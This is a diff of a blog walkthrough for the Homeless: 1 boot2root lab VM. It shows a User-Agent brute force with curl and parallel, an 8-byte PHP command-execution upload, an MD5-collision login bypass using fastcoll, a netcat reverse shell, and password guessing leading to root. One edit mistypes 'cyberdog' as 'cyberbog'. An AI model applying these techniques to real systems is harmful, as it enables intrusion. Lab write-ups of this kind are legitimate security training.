@@ -16,25 +16,25 @@ This post documents the complete walkthrough of Homeless: 1, a boot2root [VM][1]
 <!--more-->
 
 ### Background
-You've been warned. This challenge is not for beginners. :smiling_imp:
+This challenge is not for beginners :smiling_imp:
 
 ### Information Gathering
 
-Let's kick this off with a `nmap` scan to establish the services available in the host:
+Let's kick this off with a `nmap` scan to establish the services available in the host.
 
 ```
 # nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.130
-...
+…
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 28:2c:a5:57:c7:eb:82:11:4e:bc:10:45:2f:68:58:f0 (RSA)
 |_  256 4d:44:7b:95:ce:9f:86:e2:c8:b4:1c:53:85:0d:90:4a (ECDSA)
 80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
 |_http-favicon: Unknown favicon MD5: 35C5F7F583E3A0D4947237506D4676B3
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
-| http-robots.txt: 1 disallowed entry 
+| http-robots.txt: 1 disallowed entry
 |_Use Brain with Google
 |_http-server-header: Apache/2.4.25 (Debian)
 |_http-title: Transitive by TEMPLATED
@@ -52,20 +52,22 @@ Good luck!
 Hey Remember rockyou..
 ```
 
-"Use Brain with Google" is not a real path. However, there is a hint about the famed "rockyou" password list. This is how the site looked like when rendered by a browser.
+Apparently, "Use Brain with Google" is not a real path. There's also a hint about the famed "rockyou" password list.
 
-![screenshot-1](/assets/images/posts/homeless-walkthrough/screenshot-1.png){: style="display: block"} 
-![screenshot-2](/assets/images/posts/homeless-walkthrough/screenshot-2.png){: style="display: block"} 
+This is how the site looked like when rendered by a browser.
 
-Noticed something unusual? The browser's `User-Agent` string was there. In the HTML source code, something else stood out as well.
+![screenshot-1](/assets/images/posts/homeless-walkthrough/screenshot-1.png){: style="display: block"}
+![screenshot-2](/assets/images/posts/homeless-walkthrough/screenshot-2.png){: style="display: block"}
+
+Noticed anything unusual? The browser's `User-Agent` string was there. In the HTML source code, something else stood out as well.
 
 ![screenshot-3](/assets/images/posts/homeless-walkthrough/screenshot-3.png)
 
-A hint to check carefully. But what to check exactly? Perhaps to check the `User-Agent` string, in which case it was on line 32 of the HTML source code.
+A hint to check something. But what to check? Perhaps to check the `User-Agent` string on line 32 of the HTML source code?
 
 ![screenshot-4](/assets/images/posts/homeless-walkthrough/screenshot-4.png)
 
-The nifty `curl` has an option to submit user-supplied `User-Agent` string as part of the HTTP request to a site. To that end, I wrote `check.sh` to submit a custom `User-Agent` string and then check for the HTTP response at line 32. 
+The nifty `curl` has an option to submit user-supplied `User-Agent` string as part of the HTTP request to a site. To that end, I wrote `check.sh` to submit a custom `User-Agent` string and then check for the HTTP response at line 32.
 
 {% highlight bash linenos %}
 # cat check.sh
@@ -85,11 +87,11 @@ Indeed. Line 32 of the HTTP response always showed the supplied `User-Agent` str
 
 ### Finding the Way Home
 
-Recall the hint about the "rockyou" password list? Maybe the secret to finding the way home is by submitting one of the entries in the list as `User-Agent` to the site?
+Recall the hint about the "rockyou" password list? Perhaps the secret to finding the way home is by submitting one of the entries in the list as `User-Agent` to the site?
 
-There is just one problem. Rockyou password list has about 14 million entries. It'll take ages to submit the entries one at a time. Surely some form of parallelism is needed. 
+There's one problem. Rockyou password list has about 14 million entries. It'll take ages to submit the entries one at a time. Surely, we need some form of parallelism.
 
-For that I'm using [parallel][4], a command-line driven utility for Linux and other Unix-like operating systems which allows the user to execute shell scripts in parallel.
+For that, I'm using [parallel][4], a command-line driven utility for Linux and other Unix-like operating systems which allows the user to execute shell scripts in parallel.
 
 I expanded `check.sh` to include logic to stop when line 32 of the HTTP response is different from the supplied `User-Agent` string.
 
@@ -128,34 +130,34 @@ On top of that, I wrote `brute.sh`, a wrapper script to feed a wordlist to `chec
 parallel ./check.sh < $1 >> $2
 {% endhighlight %}
 
-Finally, I reduced the size of the "rockyou" list by preserving only alphanumeric characters and splitting the list into sublists of 1000 lines each.
+I reduced the size of the "rockyou" list by preserving alphanumeric characters and splitting the list into sub-lists of 1000 lines each.
 
 ```
 # grep -Pao '^[a-zA-Z0-9]+$' rockyou.txt > reducio.txt
 # split -a5 reducio.txt -d reducio_
 ```
 
-I also used `parallel` to run multiple `check.sh` in parallel to max out my CPU like so.
+I also used `parallel` to run `check.sh` in parallel to max out my CPU like so.
 
 ```
 # parallel ./brute.sh {} booyah.txt ::: reducio_*
 ```
 
-After it was finished (in about 21 minutes), the result was recorded in `booyah.txt`.
+After it finished in about 21 minutes, the result was in `booyah.txt`.
 
 ```
-# cat booyah.txt 
+# cat booyah.txt
 [!] Found: "cyberdog" - Nice Cache!.. Go there.. myuploader_priv
 ```
 
-So, the path to home can be unlocked by supplying a password as long as it contained "cyberdog".
+As long as the password contained "cyberbog", it's able to unlock the path to home.
 
 ```
 # ./check.sh "old school cyberdog"
 [!] Found: "old school cyberdog" - Nice Cache!.. Go there.. myuploader_priv
 ```
 
-On hindsight, the secret backdoor could also be revealed by looking at the `favicon`. The title clearly says "Cyberdog Starting Point", paying a little homage to Cyberdog, an Internet suite of applications, developed by Apple.
+On hindsight, I could also unlock the secret backdoor by looking at the `favicon`. The title says "Cyberdog Starting Point", paying a little homage to Cyberdog, an Internet suite of applications, developed by Apple.
 
 ![favicon](/assets/images/posts/homeless-walkthrough/favicon.jpg)
 
@@ -167,8 +169,7 @@ Navigating to `/myuploader_priv` revealed the uploader page.
 
 After some tinkering with the uploader page, this is what I observed:
 
-* The file must be 8 bytes or less; and
-* Any content type can be uploaded; and
+* The file of any content type must be 8 bytes or less; and
 * A fresh upload will replace the previous one.
 
 This is how I imagined the PHP code of the uploader page to look like.
@@ -194,9 +195,9 @@ This is how I imagined the PHP code of the uploader page to look like.
 
 ### PHP Tags and Execution Operators
 
-Gathering the restrictions from above, the challenge now is to write a short and valid PHP code of no more than 8 bytes. Fortunately, PHP supports [short open tag][5] (<tt><?=</tt>) and [execution operators][6] (<tt>\`&hellip;\`</tt>). Using these 2 short forms, I was able to squeeze in 8 bytes of valid PHP code to list the files in `/myuploader_priv/files` like so.
+Gathering the restrictions from above, the challenge now is to write a short and valid PHP code of no more than 8 bytes. PHP supports [short open tag][5] (<tt><?=</tt>) and [execution operators][6] (<tt>\`&hellip;\`</tt>). Using these 2 short forms, I was able to squeeze in 8 bytes of valid PHP code to list the files in `/myuploader_priv/files` like so.
 
-```
+```shell
 echo -n '<?=`ls`;' > test.php
 ```
 
@@ -228,7 +229,7 @@ error_reporting(0);
         $code     = (string)$_POST['code'];
 
         if (($username == $password ) or ($username == $code)  or ($password == $code)) {
-            
+
             echo 'Your input can not be the same.';
 
         } else if ((md5($username) === md5($password) ) and (md5($password) === md5($code)) ) {
@@ -246,9 +247,9 @@ error_reporting(0);
 ?>
 {% endhighlight %}
 
-I'm no cryptography expert but it's apparent that this challenge requires MD5 collisions in order to bypass the Secure Login page. I'll need 3 different strings that will result in the same MD5 hash.
+I'm no cryptography expert but it's obvious that this challenge requires MD5 collisions to bypass the Secure Login page. I'll need 3 different strings that will result in the same MD5 hash.
 
-I found a very informative [page][7] detailing how one can generate 2<sup>N</sup> collisions using `fastcoll`, a fast MD5 collision generator written by Marc Stevens.
+I found an informative [page][7] detailing how one can generate 2<sup>N</sup> collisions using `fastcoll`, a fast MD5 collision generator written by Marc Stevens.
 
 Suffice to say, I've downloaded the [source](https://github.com/brimstone/fastcoll) code of `fastcoll` and compiled it with `libboost-all-dev`.
 
@@ -275,7 +276,7 @@ rm 0 1 a b; clear
 echo "[!] MD5 of blobs"
 md5sum 00 01 10 11
 
-echo
+printf "\n"
 
 echo "[!] SHA1 of blobs"
 sha1sum 00 01 10 11
@@ -291,7 +292,7 @@ done
 
 ### On a Collision Course
 
-Using `curl` to submit 3 colliding blobs as `username`, `password` and `code` respectively, I was able to obtain a session and access `admin.php` like so.
+Using `curl` to submit 3 colliding blobs as `username`, `password` and `code` respectively, I was able to get a session and access `admin.php` like so.
 
 ```
 # curl -i -d "username=$(cat collisions/00)" -d "password=$(cat collisions/01)" -d "code=$(cat collisions/10)" -d "login=Login" http://192.168.198.130/d5fa314e8577e3a7b8534a014b4dcb221de823ad/
@@ -321,7 +322,7 @@ The terminal allowed remote command execution and `nc` with `-e` is available.
 
 ![screenshot-11](/assets/images/posts/homeless-walkthrough/screenshot-11.png)
 
-I can simply use `nc` to run a low-privilege reverse shell back to me.
+I can use `nc` to run a low-privilege reverse shell back to me.
 
 ![screenshot-12](/assets/images/posts/homeless-walkthrough/screenshot-12.png)
 
@@ -331,7 +332,7 @@ During enumeration of the system, I came across the user `downfall` and the cont
 
 ### Hail Hydra!
 
-The creator of this VM was kind enough to suggest that the password starts with "sec". Immediately, I narrowed down a password list from "rockyou".
+The creator of this VM was kind enough to suggest that the password starts with "sec". Based on this information, I narrowed down a password list from "rockyou".
 
 ```
 # grep -Pao '^sec.*$' /usr/share/wordlists/rockyou.txt > seclist.txt
@@ -362,7 +363,7 @@ Combining all the above information, I can probably edit `homeless.py` as follow
 
 ![screenshot-16](/assets/images/posts/homeless-walkthrough/screenshot-16.png)
 
-A minute later, a `root` shell appears on my `netcat` listener!
+A minute later, a `root` shell appeared on my `netcat` listener.
 
 ![screenshot-17](/assets/images/posts/homeless-walkthrough/screenshot-17.png)
 
